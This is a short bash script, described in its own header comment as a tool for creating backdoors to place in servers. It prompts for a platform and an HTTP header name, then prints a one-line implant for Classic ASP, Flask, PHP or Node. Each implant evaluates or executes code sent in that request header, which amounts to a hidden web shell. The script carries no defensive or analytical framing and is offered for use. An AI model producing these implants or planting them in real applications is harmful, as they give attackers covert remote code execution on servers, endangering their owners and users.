#!/bin/bash
# Script to create the backdoors to be placed in servers.

echo "Which software is the server running on?"
echo "1) Classic ASP"
echo "2) Flask"
echo "3) PHP"
echo "4) Node"
echo -n "Enter a number: "
read software

echo "What HTTP header should the backdoor communicate over?"
echo -n "Enter a string: "
read header

if [ $software -eq 1 ]; then
    header="$(echo "$header" | tr '[:lower:]' '[:upper:]')"
    backdoor="If request.servervariables(\"$header\") <> \"\" Then:execute(request.servervariables(\"$header\")):response.end:End If"
elif [ $software -eq 2 ]; then
    echo "Prerequisites: "
    echo "'request' from Flask must be imported for this backdoor to work."
    header="$(echo "$header" | tr '[:lower:]' '[:upper:]')"
    backdoor="if request.headers.get('$header'): global r;exec(__import__('base64').b64decode(request.headers.get('$header').encode()).decode());return r;"

elif [ $software -eq 3 ]; then
    header="$(echo "$header" | tr '[:lower:]' '[:upper:]')"
    backdoor="isset(\$_SERVER[\"HTTP_$header\"]) and eval(\$_SERVER[\"HTTP_$header\"]);"
elif [ $software -eq 4 ]; then
    echo "What is the name of the variable storing the ServerResponse object?"
    echo -n "Enter a string: "
    read response
    echo "What is the name of the variable storing the IncomingRequest object?"
    echo -n "Enter a string: "
    read request
    echo "Prerequisites: "
    echo "execSync from 'child_process' must be imported for this backdoor to work."
    header="$(echo "$header" | tr '[:upper:]' '[:lower:]')"
    backdoor="if ($request.headers?.$header) return (eval('let r=$response;let i=$request;'+i.headers?.$header));"
else
    echo "Invalid software option"
    exit 1
fi

echo "Your backdoor:"
echo "$backdoor"

exit 0